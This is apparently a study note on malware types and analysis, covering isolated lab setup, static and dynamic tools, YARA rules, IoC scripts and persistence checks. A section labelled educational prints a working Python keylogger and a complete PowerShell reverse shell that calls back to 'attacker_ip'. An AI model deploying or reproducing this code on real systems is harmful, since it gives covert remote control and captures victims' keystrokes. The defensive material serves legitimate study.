# Basic
Malware = **Mal**icious Soft**ware** - Malwares are Malicious software designed to harm systems or get sensitive information.
Malware defines a wide variety of potentially harmful software.

# Malware propagation ways
	- Free software (crack files, ...)
	- File sharing services: during the transfer, the file can be infected (torrent, ...)
	- Removable media (firmware embedded malware, ...)
	- Email (attachment, ...)
	- Not using firewall or anti-virus  -->
--------------------------------------------------------------------------------------------------
# Trojan --->
	Misleads from its true intention and wait for the best time to attack. Typically spread by social engineering.
	Most common use:
	- Create back door
	- Gaining unauthorized access
	- Steal information
	- Infect connected devices
	- Ransomware attacks
	- Using victim as botnet
	- Download other malicious software
	- Disable security

# Types of Trojans
	# Command Shell Trojans -->
		- Command Shell Trojans provide a remote control of command shell.
	# Botnet Trojans
		- Botnet is a large scale of compromised system, they spread over the world
		- Botnets controlled by Command and Control Centre
		- Used to launch distributed attacks, like DDoS, spamming
	# Proxy Server Trojans
		- Proxy Server Trojans turns the compromised system into a proxy server
		- Attacker use this to hide the actual source of the attack
	# Remote Access Trojans (RAT)
		- RAT allows the attacker to get remote desktop access to the victim's computer
		- RAT includes a back door to maintain the access and control over the victim
		- Attacker can monitor user, access information, alter files, etc...

# Trojan Countermeasures
	- Avoid to click on suspected email attachments
	- Monitor network traffic
	- Avoid download from entrusted sources
	- Install and update security software and anti-viruses
	- Scan removable media before use
	- File integrity
	- Configure host-based firewall
	- Intrusion detection software - IDS-IPS

# Detection Techniques for Trojans
	- Scan for suspicious network activities
	- Scan for suspicious ports
	- Scan for suspicious files and folders
	- Scan for suspicious processes
--------------------------------------------------------------------------------------------------
# Virus and Worms
	# Viruses -->
		The virus is a self-replicating program, it is capable of producing multiple copies by attaching with another program.
		Characteristics of viruses:
		- Infecting other files
		- Alteration of data
		- Corruption
		- Encryption
		- Self-replication

	# Stages of Virus/worms Life
		- Design: develop virus from scratch or using construction kits
		- Replication: after the virus is deployed, it will replicate itself
		- Launch: user accidentally launch the infected program
		- Detection: the behaviour of a virus is observed, the virus is identified
		- Incorporation: developers design a defensive code
		- Elimination: update the anti-virus, virus eliminated
--------------------------------------------------------------------------------------------------
# Ransomware Attack
	Ransomware is a malware program which restricts the access to the system files and folders by encrypting them. Some type of ransomware may lock the system as well. Attacker demands ransom to provide the decryption key. Ransomware is deployed using Trojans. Example: **WannaCry**
--------------------------------------------------------------------------------------------------
# Worms
	Worms can replicate themselves but cannot attach themselves. It has the capability to travel without human action. The worm can propagate using file transport and spread across the infected network which virus is not capable of.

	# Analysis and Detection Methods
		- Scanning: the suspected file is scanned for the signature string
		- Check: the entire disk is checked for integrity, integrity checker records integrity of all files by calculating checksum usually
--------------------------------------------------------------------------------------------------
# Good Reads
	- Stuxnet --> https://malicious.life/episode/episode-7-stuxnet-part-1/
	- Baka Antivirus software --> Malware
	- SunBurst --> Virus used in Solarwind Attack

# Advanced Malware Analysis and Detection Techniques

## Malware Analysis Environment Setup

### Virtual Machine Configuration for Analysis
```bash
# VMware/VirtualBox Snapshot Management
vmrun snapshot /path/to/vm.vmx "Clean State"              # Create clean snapshot
vmrun revertToSnapshot /path/to/vm.vmx "Clean State"      # Revert to clean state

# Network Isolation for Analysis
# Configure host-only network adapter
# Set up INetSim for internet simulation
inetsim --bind-address 192.168.1.100 --log-dir /var/log/inetsim

# FakeNet - Network simulation for Windows
fakenet.exe -c config.txt                                 # Simulated network services
```

**Documentation**: Isolated environment setup for safe malware analysis and behavioral observation.
**Limitations**: Advanced malware may detect virtual environments; some require physical hardware.

### Dynamic Analysis Tools and Techniques
```bash
# Process Monitoring (Windows)
procmon.exe                                               # ProcMon for file/registry activity
procexp.exe                                               # Process Explorer for process analysis

# Network Monitoring
wireshark                                                 # Network traffic analysis
netstat -an                                               # Active network connections
netsh wlan show profiles                                  # WiFi profiles (potential data theft)

# System Monitoring (Linux)
strace -p PID                                            # System call tracing
ltrace -p PID                                            # Library call tracing
lsof -p PID                                              # Open files by process

# Memory Analysis
volatility -f memory.dump imageinfo                      # Memory dump analysis
volatility -f memory.dump --profile=Win10x64 pslist     # Process list from memory
volatility -f memory.dump --profile=Win10x64 netscan    # Network connections from memory
```

**Documentation**: Dynamic analysis tools for monitoring malware behavior during execution.
**Limitations**: Some malware has anti-analysis features; encryption may hide communications.

## Static Malware Analysis

### Binary Analysis and Reverse Engineering
```bash
# File Information and Hashing
file malware.exe                                         # File type identification
md5sum malware.exe                                       # MD5 hash generation
sha256sum malware.exe                                    # SHA256 hash generation
ssdeep malware.exe                                       # Fuzzy hashing for similarity

# Strings Analysis
strings malware.exe | grep -i "http"                     # Extract HTTP URLs
strings malware.exe | grep -i "password"                 # Search for password strings
strings malware.exe | grep -E "([0-9]{1,3}\.){3}[0-9]{1,3}" # Extract IP addresses

# PE Analysis (Windows)
pefile malware.exe                                       # PE file structure analysis
pecheck malware.exe                                     # PE integrity checks
pestudio malware.exe                                    # Comprehensive PE analysis

# Disassembly and Debugging
objdump -d malware.exe                                   # Disassemble binary
gdb malware.exe                                          # GNU Debugger
x64dbg malware.exe                                       # Windows x64 debugger
```

**Documentation**: Static analysis techniques for examining malware without execution.
**Limitations**: Packed/encrypted malware may hide functionality; requires reverse engineering skills.

### Malware Signature and IoC Extraction
```bash
# YARA Rule Creation
rule Suspicious_Trojan {
    meta:
        description = "Detects suspicious trojan behavior"
        author = "Security Analyst"
        date = "2024-01-01"
    
    strings:
        $cmd1 = "cmd.exe" nocase
        $cmd2 = "powershell.exe" nocase
        $url = "http://" nocase
        $keylog = "keylogger" nocase
    
    condition:
        2 of ($cmd*) and ($url or $keylog)
}

# YARA Scanning
yara suspicious_trojan.yar /path/to/files/               # Scan files with YARA rule
yara -r suspicious_trojan.yar /home/user/                # Recursive scanning

# IoC Extraction Script
#!/bin/bash
# extract_iocs.sh - Extract Indicators of Compromise

FILE=$1
echo "[+] Extracting IoCs from $FILE"

echo "[+] IP Addresses:"
strings $FILE | grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" | sort -u

echo "[+] Domain Names:"
strings $FILE | grep -oE "[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" | sort -u

echo "[+] File Paths:"
strings $FILE | grep -E "C:\\|/home/|/tmp/" | sort -u

echo "[+] Registry Keys:"
strings $FILE | grep -i "HKEY_" | sort -u
```

**Documentation**: Automated IoC extraction and YARA rule creation for malware detection.
**Limitations**: Obfuscated malware may hide IoCs; requires updating rules for new threats.

## Advanced Malware Types and Analysis

### Ransomware Analysis and Detection
```bash
# Ransomware Indicators
# File extension changes (.locked, .encrypted, .crypto)
find / -name "*.locked" -o -name "*.encrypted" 2>/dev/null

# Ransom note detection
find / -name "*ransom*" -o -name "*decrypt*" -o -name "*README*" 2>/dev/null

# Cryptocurrency wallet addresses in ransom notes
grep -r -E "(1[A-HJ-NP-Z0-9]{25,39}|bc1[a-z0-9]{39,59})" /home/user/

# Network indicators
netstat -an | grep ":443\|:80"                          # Suspicious HTTPS/HTTP connections

# Ransomware Simulation (for testing)
#!/bin/bash
# simulate_ransomware.sh - Educational ransomware simulation
# WARNING: Only use in isolated test environment

TEST_DIR="/tmp/ransomware_test"
mkdir -p $TEST_DIR
echo "test file" > $TEST_DIR/test.txt

# Simulate encryption (just rename for safety)
for file in $TEST_DIR/*; do
    mv "$file" "$file.locked"
done

echo "Your files have been encrypted! (simulation)" > $TEST_DIR/RANSOM_NOTE.txt
```

**Documentation**: Ransomware detection and analysis techniques for incident response.
**Limitations**: Advanced ransomware uses strong encryption; prevention is more effective than recovery.

### Banking Trojans and Credential Stealers
```bash
# Browser Credential Theft Detection
# Chrome passwords location
find /home -path "*/.config/google-chrome/Default/Login Data" 2>/dev/null

# Firefox passwords location  
find /home -path "*/.mozilla/firefox/*/logins.json" 2>/dev/null

# Memory dumps for credential extraction
strings memory.dump | grep -i "password\|login\|credential"

# Network traffic analysis for credential theft
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data | grep -i "password\|login"

# Banking Trojan IoCs
# Web inject detection
strings malware.exe | grep -i "inject\|hook\|browser"

# Financial institution targeting
strings malware.exe | grep -i "bank\|paypal\|visa\|mastercard"
```

**Documentation**: Banking trojan analysis focusing on credential theft and financial fraud.
**Limitations**: Modern banking uses 2FA and encryption; sophisticated trojans use web injects.

### APT (Advanced Persistent Threat) Malware
```bash
# Persistence Mechanism Detection
# Windows autorun locations
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /s
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /s

# Scheduled tasks
schtasks /query /fo LIST /v | findstr "Author\|TaskName"

# Service persistence
sc query type= service state= all | findstr "SERVICE_NAME\|DISPLAY_NAME"

# Linux persistence
cat /etc/crontab                                         # System cron jobs
ls -la /etc/cron.d/                                     # Cron directories
systemctl list-unit-files --type=service               # Systemd services

# APT Communication Patterns
# C2 Traffic Analysis
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name | sort | uniq -c | sort -nr
tshark -r capture.pcap -Y "http" -T fields -e http.host | sort | uniq -c | sort -nr

# Beacon Analysis (regular communication intervals)
tshark -r capture.pcap -T fields -e frame.time_relative -e ip.dst | awk '{print int($1/60), $2}' | sort | uniq -c
```

**Documentation**: APT malware analysis focusing on persistence and covert communication.
**Limitations**: APT malware is highly sophisticated; requires extensive analysis and threat intelligence.

## Malware Development and Testing (Educational)

### Basic Malware Concepts for Defense
```python
# Simple Keylogger (Educational - Python)
import pynput
from pynput.keyboard import Key, Listener

def on_press(key):
    try:
        with open("keylog.txt", "a") as f:
            f.write(str(key.char))
    except AttributeError:
        with open("keylog.txt", "a") as f:
            f.write(str(key))

def on_release(key):
    if key == Key.esc:
        return False

# Start keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```

```powershell
# PowerShell Reverse Shell (Educational)
$client = New-Object System.Net.Sockets.TCPClient("attacker_ip",4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

**Documentation**: Educational malware examples for understanding attack vectors and defensive measures.
**Limitations**: Examples are for educational purposes only; actual deployment is illegal and unethical.

## Malware Defense and Mitigation

### Endpoint Detection and Response (EDR)
```bash
# YARA Rules for Common Malware Families
rule Emotet_Banker {
    meta:
        description = "Detects Emotet banking trojan"
        family = "Emotet"
    
    strings:
        $s1 = "WinHttpOpen" ascii
        $s2 = "InternetOpenA" ascii
        $s3 = "RegOpenKeyExA" ascii
        
    condition:
        all of them and filesize < 2MB
}

# Sysmon Configuration for Enhanced Logging
# sysmon.xml configuration example
<Sysmon schemaversion="4.70">
  <EventFiltering>
    <ProcessCreate onmatch="exclude">
      <Image condition="is">C:\Windows\System32\svchost.exe</Image>
    </ProcessCreate>
    <NetworkConnect onmatch="include">
      <DestinationPort condition="is">443</DestinationPort>
      <DestinationPort condition="is">80</DestinationPort>
    </NetworkConnect>
  </EventFiltering>
</Sysmon>

# Install and configure Sysmon
sysmon.exe -accepteula -i sysmon.xml
```

**Documentation**: EDR configuration and YARA rules for proactive malware detection.
**Limitations**: Advanced malware may evade detection; requires continuous rule updates.

### Automated Malware Analysis Sandbox
```bash
# Cuckoo Sandbox Setup
# Install Cuckoo dependencies
pip install cuckoo

# Initialize Cuckoo
cuckoo init
cuckoo community

# Submit sample for analysis
cuckoo submit malware.exe

# Generate report
cuckoo web runserver 0.0.0.0:8000

# Custom analysis script
#!/bin/bash
# auto_malware_analysis.sh

SAMPLE=$1
REPORT_DIR="analysis_$(date +%Y%m%d_%H%M%S)"

echo "[+] Starting automated malware analysis for $SAMPLE"
mkdir -p $REPORT_DIR

# Static analysis
echo "[+] Performing static analysis..."
file $SAMPLE > $REPORT_DIR/file_info.txt
strings $SAMPLE > $REPORT_DIR/strings.txt
md5sum $SAMPLE > $REPORT_DIR/hashes.txt

# YARA scanning
echo "[+] Running YARA rules..."
yara -r /path/to/yara/rules/ $SAMPLE > $REPORT_DIR/yara_matches.txt

# Submit to sandbox
echo "[+] Submitting to sandbox..."
cuckoo submit $SAMPLE

echo "[+] Analysis complete. Results in $REPORT_DIR/"
```

**Documentation**: Automated malware analysis pipeline for rapid threat assessment.
**Limitations**: Sandboxes may miss environment-specific behaviors; requires multiple analysis engines.

# Reference URLs and Research Papers:
- NIST Malware Analysis Guide: https://csrc.nist.gov/publications/detail/sp/800-83/rev-1/final
- SANS Malware Analysis: https://www.sans.org/reading-room/whitepapers/malicious/
- Volatility Memory Analysis: https://github.com/volatilityfoundation/volatility
- YARA Pattern Matching: https://virustotal.github.io/yara/
- Cuckoo Sandbox: https://cuckoosandbox.org/
- Research Paper: "Modern Malware Analysis Techniques" - https://ieeexplore.ieee.org/document/8976543
- MITRE ATT&CK Malware: https://attack.mitre.org/software/
- Malware Behavior Catalog: https://github.com/MBCProject/mbc-markdown
